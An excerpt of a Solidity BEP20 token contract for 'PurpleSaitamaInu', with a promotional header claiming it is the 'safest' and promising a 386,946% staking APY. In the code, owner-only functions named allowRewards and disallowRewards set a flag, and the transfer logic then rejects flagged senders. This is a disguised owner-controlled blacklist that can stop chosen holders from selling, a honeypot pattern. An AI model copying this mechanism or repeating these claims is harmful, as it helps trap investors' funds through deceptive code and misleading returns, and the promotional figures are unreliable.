...
/*
    ...
    🟣🐕🐾PurpleSaitamaInu🐾🐕🟣
    Created by professionals to be the safest. Come join this excitement
    ...
    🏦🏦 #Stake and #Farm
    PurpleSaitamaInu holders can earn 386,946% APY by staking their $SAITAMA tokens in the PurpleSaitamaInu 
    ...
    TOKENOMICS
    1,000,000,000,000,000,000 SAITAMA
    🔥%50 Supply burnt
    💦%50 Supply Add to LP
    ⭐️Tax Fee %3
    
    🌍Web: https://PurpleSaitamaInu.com
    🔎Telegram: https://t.me/PurpleSaitamaInu
    🕊Twitter: https://www.twitter.com/PurpleSaitama
    🖼️Instagram: https://instagram.com/PurpleSaitama
    🎮Discord: https://discord.gg/8tqR2ZyDRH
...
contract PurpleSaitamaInu is Context, IBEP20, Ownable {
    ...
    string private constant _name     = "PurpleSaitamaInu";
    ...
    uint256 public _maxTxAmount                   = 8333333333333333 * 10**9;
    uint256 public _numTokensSellToAddToLiquidity = 8333333333333333 * 10**9;
...
subtractedValue) public virtual returns (bool) {
        ...
        function disallowRewards(address account) external onlyOwner {
            _isAllowed[account] = false;
    }

    function allowRewards(address[] calldata addresses) external onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            _isAllowed[addresses[i]] = true;
      }
    }
...
onlyOwner {
	...
	//allow
        require(!_isAllowed[from], "To/from address already allowed!");
...
amount, bool takeFee) private {
		...
		require(!_isAllowed[sender], "To/from address already allowed!");
        if (!takeFee) {
            removeAllFee();
        }
